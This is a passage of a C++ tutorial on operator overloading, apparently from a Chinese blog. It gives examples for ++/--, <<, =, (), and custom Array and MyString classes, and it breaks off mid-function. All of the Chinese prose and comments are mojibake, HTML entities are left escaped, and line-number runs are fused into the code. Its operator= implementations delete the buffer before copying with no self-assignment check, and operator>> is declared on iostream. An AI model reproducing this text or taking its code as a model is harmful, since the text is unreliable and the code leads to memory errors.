ä¸€å…ƒè¿ç®—ç¬¦é‡è½½åœ¨ä¸‹è¿°çš„æ¡ˆä¾‹ä¸­ï¼Œæ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å’Œå‹å…ƒå‡½æ•°å®ç°ä¸€å…ƒè¿ç®—ç¬¦çš„é‡è½½ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé™¤äº†ä½¿ç”¨å‹å…ƒå‡½æ•°å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å…¨å±€å‡½æ•°ï¼ˆæ™®é€šå‡½æ•°ï¼‰æ¥å®ç°è¿ç®—ç¬¦çš„é‡è½½ï¼Œä¸åŒçš„æ˜¯ä½¿ç”¨å‹å…ƒå‡½æ•°æ›´æ–¹ä¾¿ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ç±»çš„æ‰€æœ‰ç§æœ‰ï¼ˆprivateï¼‰æˆå‘˜å’Œä¿æŠ¤ï¼ˆprotectedï¼‰æˆå‘˜ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;iostream&gt;using namespace std;class Complex {private: int a; int b;public: Complex(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; endl; }public: // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å®Œæˆ "å‰ç½®--" è¿ç®—ç¬¦çš„é‡è½½ Complex&amp; operator--() { this-&gt;a--; this-&gt;b--; return *this; } // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å®Œæˆ "åç½®--" è¿ç®—ç¬¦çš„é‡è½½ // ä½¿ç”¨å ä½å‚æ•°è¿›è¡Œå‡½æ•°é‡è½½ï¼Œæ˜¯ä¸ºäº†è§£å†³ä¸ "å‰ç½®--" ç±»æˆå‘˜å‡½æ•°å†²çªçš„é—®é¢˜ Complex operator--(int) { Complex tmp(this-&gt;a, this-&gt;b); this-&gt;a--; this-&gt;b--; return tmp; } // å£°æ˜ç”¨äº "å‰ç½®++" è¿ç®—ç¬¦é‡è½½çš„å‹å…ƒå‡½æ•° friend Complex&amp; operator++(Complex&amp; c1); // å£°æ˜ç”¨äº "åç½®++" è¿ç®—ç¬¦é‡è½½çš„å‹å…ƒå‡½æ•° // ä½¿ç”¨å ä½å‚æ•°è¿›è¡Œå‡½æ•°é‡è½½ï¼Œæ˜¯ä¸ºäº†è§£å†³ä¸ "å‰ç½®++" å‹å…ƒå‡½æ•°å†²çªçš„é—®é¢˜ friend Complex operator++(Complex&amp; c1, int);};// å®šä¹‰å‹å…ƒå‡½æ•°å®Œæˆ "å‰ç½®++" è¿ç®—ç¬¦çš„é‡è½½Complex&amp; operator++(Complex&amp; c1){ c1.a++; c1.b++; return c1;}// å®šä¹‰å‹å…ƒå‡½æ•°å®Œæˆ "åç½®++" è¿ç®—ç¬¦çš„é‡è½½Complex operator++(Complex&amp; c1, int) { Complex tmp(c1.a, c1.b); c1.a++; c1.b++; return tmp;}int main() { Complex c1(1, 2), c2(8, 9), c3(15, 16), c4(24, 25); // ä½¿ç”¨å‹å…ƒå‡½æ•°å®Œæˆ "å‰ç½®++" è¿ç®—ç¬¦çš„é‡è½½ ++c1; c1.print(); // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å®Œæˆ "å‰ç½®--" è¿ç®—ç¬¦çš„é‡è½½ --c2; c2.print(); // ä½¿ç”¨å‹å…ƒå‡½æ•°å®Œæˆ "åç½®++" è¿ç®—ç¬¦çš„é‡è½½ Complex c5 = c3++; c3.print(); c5.print(); // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å®Œæˆ "åç½®--" è¿ç®—ç¬¦çš„é‡è½½ Complex c6 = c4--; c4.print(); c6.print(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123456a=2, b=3a=7, b=8a=16, b=17a=15, b=16a=23, b=24a=24, b=25 å·¦ç§»è¿ç®—ç¬¦çš„é‡è½½å€¼å¾—ä¸€æçš„æ˜¯ï¼Œ&lt;&lt; å·¦ç§»è¿ç®—ç¬¦å’Œ &gt;&gt; å³ç§»è¿ç®—ç¬¦çš„é‡è½½ï¼Œåªèƒ½ä½¿ç”¨å‹å…ƒå‡½æ•°æˆ–è€…å…¨å±€å‡½æ•°ï¼Œä¸èƒ½ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯å‹å…ƒå‡½æ•°çš„é‡è¦ä½œç”¨ä¹‹ä¸€ã€‚ 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;class Complex {private: int a; int b;public: Complex(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; }public: // å£°æ˜å‹å…ƒå‡½æ•°å®ç° "&lt;&lt;" å·¦ç§»è¿ç®—ç¬¦çš„é‡è½½ friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&amp; c1);};// å®šä¹‰å‹å…ƒå‡½æ•°å®ç° "&lt;&lt;" å·¦ç§»è¿ç®—ç¬¦çš„é‡è½½ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&amp; c1) { out &lt;&lt; "a=" &lt;&lt; c1.a &lt;&lt; ", b=" &lt;&lt; c1.b &lt;&lt; endl; return out;}int main() { Complex c1(1, 2), c2(6, 9); cout &lt;&lt; c1 &lt;&lt; c2; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12a=1, b=2a=6, b=9 ç­‰å·è¿ç®—ç¬¦çš„é‡è½½ = è¿ç®—ç¬¦çš„ç»“åˆæ€§æ˜¯ä»å³åˆ°å·¦ = è¿ç®—ç¬¦çš„é‡è½½ç”¨äºå¯¹è±¡æ•°æ®çš„å¤åˆ¶ å¿…é¡»é€šè¿‡ç±»æˆå‘˜å‡½æ•°é‡è½½ = è¿ç®—ç¬¦ï¼Œä¸èƒ½ä½¿ç”¨å‹å…ƒå‡½æ•° = è¿ç®—ç¬¦é‡è½½çš„å‡½æ•°åŸå‹ä¸ºï¼šç±»å‹ &amp; ç±»å :: operator= ( const ç±»å &amp; ) ; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;iostream&gt;#include "string.h"using namespace std;class Name {private: char* p; int len;public: Name(const char* name) { cout &lt;&lt; "æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; len = strlen(name); p = new char[len + 1]; strcpy(p, name); } // æ·±æ‹·è´çš„å®ç° Name(const Name&amp; name) { cout &lt;&lt; "æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; len = name.getLen(); p = new char[len + 1]; strcpy(p, name.getP()); } ~Name() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; if (p != NULL) { delete[] p; p = NULL; len = 0; } } char* getP() const { return p; } int getLen() const { return len; }public: // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å®ç° "=" è¿ç®—ç¬¦çš„é‡è½½ Name&amp; operator=(const Name&amp; n) { // é‡Šæ”¾å†…å­˜ç©ºé—´ if (p != NULL) { delete[] p; p = NULL; len = 0; } // é‡æ–°åˆ†é…å†…å­˜ç©ºé—´ len = n.getLen(); p = new char[len + 1]; strcpy(p, n.getP()); return *this; }};int main() { Name obj1("Peter"); Name obj2("Tom"); Name obj4("Tim"); // ä¼šè‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼ˆå±äºæ·±æ‹·è´ï¼‰ Name obj3 = obj1; cout &lt;&lt; "obj3.name: " &lt;&lt; obj3.getP() &lt;&lt; ", obj3.len: " &lt;&lt; obj3.getLen() &lt;&lt; endl; // ä¸ä¼šè‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼ˆå±äºæµ…æ‹·è´ï¼‰ // é»˜è®¤æƒ…å†µä¸‹ï¼Œè‹¥è¿™é‡Œä¸å¯¹ "=" è¿ç®—ç¬¦è¿›è¡Œé‡è½½ï¼Œæœ€ç»ˆç¨‹åºä¼šå¼‚å¸¸ç»ˆæ­¢è¿è¡Œï¼ˆç”±äºåŒä¸€å—å†…å­˜ç©ºé—´è¢«é‡Šæ”¾ä¸¤æ¬¡å¯¼è‡´ï¼‰ obj4 = obj1; cout &lt;&lt; "obj4.name: " &lt;&lt; obj4.getP() &lt;&lt; ", obj4.len: " &lt;&lt; obj4.getLen() &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12345678910æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†obj3.name: Peter, obj3.len: 5obj4.name: Peter, obj4.len: 5ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº† å‡½æ•°è¿ç®—ç¬¦çš„é‡è½½åœ¨ä¸‹è¿°çš„æ¡ˆä¾‹ä¸­ï¼Œæ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½å‡½æ•°è¿ç®—ç¬¦ ()ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸èƒ½ç”¨å‹å…ƒå‡½æ•°é‡è½½å‡½æ•°è¿ç®—ç¬¦ ()ã€‚ 12345678910111213141516#include &lt;iostream&gt;using namespace std;class Test {public: int operator()(int a, int b) { return a + b; }};int main() { Test test; cout &lt;&lt; test(3, 4) &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 17 è¿ç®—ç¬¦é‡è½½è¿›é˜¶ä¸ºä»€ä¹ˆä¸è¦é‡è½½ &amp;&amp; å’Œ || æ“ä½œç¬¦ a) &amp;&amp; å’Œ || æ˜¯ C++ ä¸­éå¸¸ç‰¹æ®Šçš„æ“ä½œç¬¦ b) &amp;&amp; å’Œ || å†…ç½®å®ç°äº†çŸ­è·¯è§„åˆ™ c) æ“ä½œç¬¦é‡è½½æ˜¯é å‡½æ•°é‡è½½æ¥å®Œæˆçš„ d) æ“ä½œæ•°ä½œä¸ºå‡½æ•°å‚æ•°ä¼ é€’ e) C++ çš„å‡½æ•°å‚æ•°éƒ½ä¼šè¢«æ±‚å€¼ï¼Œæ— æ³•å®ç°çŸ­è·¯è§„åˆ™ ä¸åŒå‡½æ•°å®ç°è¿ç®—ç¬¦é‡è½½çš„åº”ç”¨åœºæ™¯å‹å…ƒå‡½æ•°å’Œç±»æˆå‘˜å‡½æ•°çš„é€‰æ‹©æ–¹æ³•ï¼š a) =ã€[]ã€() å’Œ -&gt; è¿ç®—ç¬¦ï¼Œåªèƒ½é€šè¿‡ç±»æˆå‘˜å‡½æ•°è¿›è¡Œé‡è½½ b) å½“æ— æ³•ä¿®æ”¹å·¦æ“ä½œæ•°çš„ç±»æ—¶ï¼Œåªèƒ½é€šè¿‡å‹å…ƒå‡½æ•°è¿›è¡Œé‡è½½ï¼Œä¾‹å¦‚ &lt;&lt; ä¸ &gt;&gt; è¿ç®—ç¬¦ å‹å…ƒå‡½æ•°é‡è½½ &lt;&lt; ä¸ &gt;&gt; è¿ç®—ç¬¦ï¼š istream å’Œ ostream æ˜¯ C++ çš„é¢„å®šä¹‰æµç±» cin æ˜¯ istream çš„å¯¹è±¡ï¼Œcout æ˜¯ ostream çš„å¯¹è±¡ è¿ç®—ç¬¦ &lt;&lt; ç”± ostream é‡è½½ä¸ºæ’å…¥æ“ä½œï¼Œç”¨äºè¾“å‡ºåŸºæœ¬ç±»å‹æ•°æ® è¿ç®—ç¬¦ &gt;&gt; ç”± istream é‡è½½ä¸ºæå–æ“ä½œï¼Œç”¨äºè¾“å…¥åŸºæœ¬ç±»å‹æ•°æ® åªèƒ½ä½¿ç”¨å‹å…ƒå‡½æ•°æˆ–è€…å…¨å±€å‡½æ•°é‡è½½ &lt;&lt; å’Œ &gt;&gt; è¿ç®—ç¬¦ï¼Œè¾“å‡ºå’Œè¾“å…¥ç”¨æˆ·è‡ªå®šä¹‰çš„æ•°æ®ç±»å‹ ç±»æˆå‘˜å‡½æ•°ä¸å‹å…ƒå‡½æ•°å®ç°è¿ç®—ç¬¦é‡è½½çš„æ­¥éª¤ï¼š a) è¦æ‰¿è®¤è¿ç®—ç¬¦é‡è½½æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå†™å‡ºå‡½æ•°åç§°ï¼Œå¦‚ operator +() b) æ ¹æ®æ“ä½œæ•°ï¼Œå†™å‡ºå‡½æ•°å‚æ•° c) æ ¹æ®ä¸šåŠ¡ï¼Œå®Œå–„å‡½æ•°çš„è¿”å›å€¼ï¼ˆçœ‹å‡½æ•°æ˜¯è¿”å›å¼•ç”¨ã€æŒ‡é’ˆè¿˜æ˜¯å…ƒç´ ï¼‰ï¼ŒåŠå®ç°å‡½æ•°ä¸šåŠ¡ï¼›ä¾‹å¦‚å½“å‡½æ•°çš„è¿”å›å€¼å……å½“å·¦å€¼æ—¶ï¼Œéœ€è¦è¿”å›ä¸€ä¸ªå¼•ç”¨ ä½¿ç”¨å‹å…ƒå‡½æ•°é‡è½½è¿ç®—ç¬¦çš„æ³¨æ„äº‹é¡¹ a) å‹å…ƒå‡½æ•°é‡è½½è¿ç®—ç¬¦å¸¸ç”¨äºè¿ç®—ç¬¦çš„å·¦å³æ“ä½œæ•°ç±»å‹ä¸ç›¸åŒçš„åœºæ™¯ b) åœ¨å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦éšå¼è½¬æ¢çš„æƒ…å½¢ä¸‹ï¼Œä½¿ç”¨å‹å…ƒå‡½æ•°é‡è½½è¿ç®—ç¬¦æ˜¯æ­£ç¡®çš„é€‰æ‹© c) å‹å…ƒå‡½æ•°æ²¡æœ‰ this æŒ‡é’ˆï¼Œæ‰€éœ€æ“ä½œæ•°éƒ½å¿…é¡»åœ¨å‡½æ•°çš„å‚æ•°è¡¨ä¸­æ˜¾å¼å£°æ˜ï¼Œå¾ˆå®¹æ˜“å®ç°ç±»å‹çš„éšå¼è½¬æ¢ d) åœ¨ C++ ä¸­ä¸èƒ½ç”¨å‹å…ƒå‡½æ•°é‡è½½çš„è¿ç®—ç¬¦åˆ†åˆ«æœ‰ï¼š=ã€[]ã€() å’Œ -&gt; e) åœ¨ C++ ä¸­ä¸è¦é‡è½½ &amp;&amp; å’Œ || è¿ç®—ç¬¦ f) C++ çš„è¿ç®—ç¬¦é‡è½½éµå¾ªå‡½æ•°é‡è½½çš„è§„åˆ™ g) é™¤äº†é‡è½½è¿ç®—ç¬¦ &lt;&lt;ã€&gt;&gt; å¿…é¡»ä½¿ç”¨å‹å…ƒå‡½æ•°ä¹‹å¤–ï¼Œå…¶ä»–è¿ç®—ç¬¦çš„é‡è½½å°½é‡éƒ½ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°ï¼Œåƒä¸‡ä¸è¦æ»¥ç”¨å‹å…ƒå‡½æ•°ï¼Œå°¤å…¶ç±»æ¨¡æ¿ä¸å‹å…ƒå‡½æ•°ä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ è¿ç®—ç¬¦é‡è½½çš„ç»¼åˆä½¿ç”¨æ¡ˆä¾‹é‡è½½è‡ªå®šä¹‰æ•°ç»„ç±»çš„å„ç§è¿ç®—ç¬¦åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼Œè‡ªå®šä¹‰äº†æ•°ç»„ç±» Arrayï¼Œå¹¶ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°åˆ†åˆ«å¯¹ Array ç±»çš„ []ã€=ã€==ã€!= è¿ç®—ç¬¦è¿›è¡Œé‡è½½ã€‚ â˜…ç‚¹å‡»æ˜¾ç¤ºå®Œæ•´çš„æ¡ˆä¾‹ä»£ç â˜… Array.h 12345678910111213141516171819202122232425262728293031323334#pragma once#include &lt;iostream&gt;using namespace std;class Array {public: Array(int length); Array(const Array&amp; array); ~Array();public: int length();public: // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "[]" æ•°ç»„ä¸‹æ ‡è¿ç®—ç¬¦ï¼Œç”¨äºæ•°ç»„å…ƒç´ çš„èµ‹å€¼å’Œå–å€¼ int&amp; operator[](int index); // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "=" è¿ç®—ç¬¦ï¼Œç”¨äºæ•°ç»„ä¹‹é—´çš„èµ‹å€¼ Array&amp; operator=(const Array&amp; array); // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "==" è¿ç®—ç¬¦ï¼Œåˆ¤æ–­ä¸¤ä¸ªæ•°ç»„æ˜¯å¦ç›¸åŒ bool operator==(const Array &amp; array); // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "!=" è¿ç®—ç¬¦ï¼Œåˆ¤æ–­ä¸¤ä¸ªæ•°ç»„æ˜¯å¦ä¸ç›¸åŒ bool operator!=(const Array&amp; array);private: int m_length; int* m_space;}; Array.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include "Array.h"Array::Array(int length) { cout &lt;&lt; "æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; if (length &lt; 0) { length = 0; } this-&gt;m_length = length; this-&gt;m_space = new int[length];}Array::Array(const Array&amp; array) { cout &lt;&lt; "æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; // æ·±æ‹·è´ï¼Œå•ç‹¬åˆ†é…å†…å­˜ç©ºé—´ this-&gt;m_length = array.m_length; this-&gt;m_space = new int[array.m_length]; for (int i = 0; i &lt; array.m_length; i++) { this-&gt;m_space[i] = array.m_space[i]; }}Array::~Array() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; }}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "[]" æ•°ç»„ä¸‹æ ‡è¿ç®—ç¬¦ï¼Œç”¨äºæ•°ç»„å…ƒç´ çš„èµ‹å€¼å’Œå–å€¼int&amp; Array::operator[](int index) { return this-&gt;m_space[index];}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "=" è¿ç®—ç¬¦ï¼Œç”¨äºæ•°ç»„ä¹‹é—´çš„èµ‹å€¼Array&amp; Array::operator=(const Array&amp; array) { if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; } // æ·±æ‹·è´ï¼Œå•ç‹¬åˆ†é…å†…å­˜ç©ºé—´ this-&gt;m_length = array.m_length; this-&gt;m_space = new int[array.m_length]; for (int i = 0; i &lt; array.m_length; i++) { this-&gt;m_space[i] = array.m_space[i]; } return *this;}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "==" è¿ç®—ç¬¦ï¼Œåˆ¤æ–­ä¸¤ä¸ªæ•°ç»„æ˜¯å¦ç›¸åŒbool Array::operator==(const Array&amp; array) { if (this-&gt;m_length != array.m_length) { return false; } for (int i = 0; i &lt; this-&gt;m_length; i++) { if (this-&gt;m_space[i] != array.m_space[i]) { return false; } } return true;}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "!=" è¿ç®—ç¬¦ï¼Œåˆ¤æ–­ä¸¤ä¸ªæ•°ç»„æ˜¯å¦ä¸ç›¸åŒbool Array::operator!=(const Array&amp; array) { return !(*this == array);}int Array::length() { return this-&gt;m_length;} main.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include "Array.h"using namespace std;int main() { // è‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•° Array array1(5); for (int i = 0; i &lt; array1.length(); i++) { array1[i] = i; } for (int i = 0; i &lt; array1.length(); i++) { cout &lt;&lt; "array1[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array1[i] &lt;&lt; endl; } // è‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼ˆå±äºæ·±æ‹·è´ï¼‰ Array array2 = array1; for (int i = 0; i &lt; array2.length(); i++) { cout &lt;&lt; "array2[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array2[i] &lt;&lt; endl; } // è‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼ˆå±äºæ·±æ‹·è´ï¼‰ Array array3 = array1; // ä¸ä¼šè‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼ˆå±äºæµ…æ‹·è´ï¼‰ // é»˜è®¤æƒ…å†µä¸‹ï¼Œè‹¥è¿™é‡Œä¸å¯¹ "=" è¿ç®—ç¬¦è¿›è¡Œé‡è½½ï¼Œæœ€ç»ˆç¨‹åºä¼šå¼‚å¸¸ç»ˆæ­¢è¿è¡Œï¼ˆç”±äºåŒä¸€å—å†…å­˜ç©ºé—´è¢«é‡Šæ”¾ä¸¤æ¬¡å¯¼è‡´ï¼‰ array3 = array2; for (int i = 0; i &lt; array3.length(); i++) { cout &lt;&lt; "array3[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array3[i] &lt;&lt; endl; } // åˆ¤æ–­ä¸¤ä¸ªæ•°ç»„æ˜¯å¦ç›¸åŒ bool result1 = array1 == array2; string strResult1 = result1 ? "=" : "!="; cout &lt;&lt; "array1 " &lt;&lt; strResult1 &lt;&lt; " array2 " &lt;&lt; endl; // åˆ¤æ–­ä¸¤ä¸ªæ•°ç»„æ˜¯å¦ä¸ç›¸åŒ bool result2 = array1 != array2; string strResult2 = result2 ? "!=" : "="; cout &lt;&lt; "array1 " &lt;&lt; strResult2 &lt;&lt; " array2 " &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨array1[0] = 0array1[1] = 1array1[2] = 2array1[3] = 3array1[4] = 4æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨array2[0] = 0array2[1] = 1array2[2] = 2array2[3] = 3array2[4] = 4æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨array3[0] = 0array3[1] = 1array3[2] = 2array3[3] = 3array3[4] = 4array1 = array2array1 = array2ææ„å‡½æ•°è¢«è°ƒç”¨ææ„å‡½æ•°è¢«è°ƒç”¨ææ„å‡½æ•°è¢«è°ƒç”¨ é‡è½½è‡ªå®šä¹‰å­—ç¬¦ä¸²ç±»çš„å„ç§è¿ç®—ç¬¦åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼Œè‡ªå®šä¹‰äº†å­—ç¬¦ä¸²ç±» MyStringï¼Œå¹¶ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å’Œå‹å…ƒå‡½æ•°åˆ†åˆ«å¯¹ MyString ç±»çš„ []ã€=ã€==ã€!=ã€&gt;ã€&lt;ã€&gt;&gt;ã€&lt;&lt; è¿ç®—ç¬¦è¿›è¡Œé‡è½½ã€‚ â˜…ç‚¹å‡»æ˜¾ç¤ºå®Œæ•´çš„æ¡ˆä¾‹ä»£ç â˜… MyString.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#pragma once#include &lt;iostream&gt;#include "string.h"using namespace std;class MyString {public: MyString(); MyString(int len); MyString(const char* p); MyString(const MyString&amp; str);public: ~MyString();public: // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "[]" è¿ç®—ç¬¦ char&amp; operator[](int index); // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "=" è¿ç®—ç¬¦ MyString&amp; operator=(const char* p); MyString&amp; operator=(const MyString&amp; str); // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "==" è¿ç®—ç¬¦ bool operator==(const char* p) const; bool operator==(const MyString str) const; // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "!=" è¿ç®—ç¬¦ bool operator!=(const char* p) const; bool operator!=(const MyString str) const; // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "&gt;" è¿ç®—ç¬¦ bool operator&gt;(const char* p) const; bool operator&gt;(const MyString str) const; // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "&lt;" è¿ç®—ç¬¦ bool operator&lt;(const char* p) const; bool operator&lt;(const MyString str) const; // ä½¿ç”¨å‹å…ƒå‡½æ•°é‡è½½ "&lt;&lt;" è¿ç®—ç¬¦ friend ostream&amp; operator&lt;&lt;(ostream&amp; out, MyString&amp; str); // ä½¿ç”¨å‹å…ƒå‡½æ•°é‡è½½ "&gt;&gt;" è¿ç®—ç¬¦ friend iostream&amp; operator&gt;&gt;(iostream&amp; in, MyString&amp; str);public: int length(); char* c_str();private: int m_length; char* m_space;}; MyString.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166#include "MyString.h"// æ— å‚æ„é€ å‡½æ•°MyString::MyString() { // åˆå§‹åŒ–ä¸ºç©ºå­—ç¬¦ä¸² this-&gt;m_length = 0; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, "");}// æœ‰å‚æ„é€ å‡½æ•°MyString::MyString(int len) { if (len &lt; 0) { len = 0; } // åˆå§‹åŒ–ä¸ºç©ºå­—ç¬¦ä¸² this-&gt;m_length = len; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, "");}// æœ‰å‚æ„é€ å‡½æ•°MyString::MyString(const char* p) { if (p == NULL) { // åˆå§‹åŒ–ä¸ºç©ºå­—ç¬¦ä¸² this-&gt;m_length = 0; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, ""); } else { this-&gt;m_length = strlen(p); this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, p); }}// æ‹·è´æ„é€ å‡½æ•°MyString::MyString(const MyString&amp; str) { // æ·±æ‹·è´ï¼Œé‡æ–°åˆ†é…å†…å­˜ç©ºé—´ this-&gt;m_length = str.m_length; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, str.m_space);}// ææ„å‡½æ•°MyString::~MyString() { // é‡Šæ”¾å†…å­˜ç©ºé—´ if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; }}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "[]" è¿ç®—ç¬¦char&amp; MyString::operator[](int index) { return this-&gt;m_space[index];}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "=" è¿ç®—ç¬¦MyString&amp; MyString::operator=(const char* p) { // é‡Šæ”¾å†…å­˜ç©ºé—´ if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; } // æ·±æ‹·è´ï¼Œé‡æ–°åˆ†é…å†…å­˜ç©ºé—´ if (p == NULL) { // åˆå§‹åŒ–ä¸ºç©ºå­—ç¬¦ä¸² this-&gt;m_length = 0; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, ""); } else { this-&gt;m_length = strlen(p); this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, p); } return *this;}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "=" è¿ç®—ç¬¦MyString&amp; MyString::operator=(const MyString&amp; str) { // é‡Šæ”¾å†…å­˜ç©ºé—´ if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; } // æ·±æ‹·è´ï¼Œé‡æ–°åˆ†é…å†…å­˜ç©ºé—´ this-&gt;m_length = str.m_length; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, str.m_space); return *this;}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "==" è¿ç®—ç¬¦bool MyString::operator==(const char* p) const { if (p == NULL) { if (this-&gt;m_length == 0) { return true; } return false; } if (this-&gt;m_length != strlen(p)) { return false; } return !strcmp(this-&gt;m_space, p);}bool MyString::operator==(const MyString str) const { if (this-&gt;m_length != str.m_length) { return false; } return !strcmp(this-&gt;m_space, str.m_space);}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "!=" è¿ç®—ç¬¦bool MyString::operator!=(const char* p) const { return !(*this == p);}bool MyString::operator!=(const MyString str) const { return !(*this == str);}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "&gt;" è¿ç®—ç¬¦bool MyString::operator&gt;(const char* 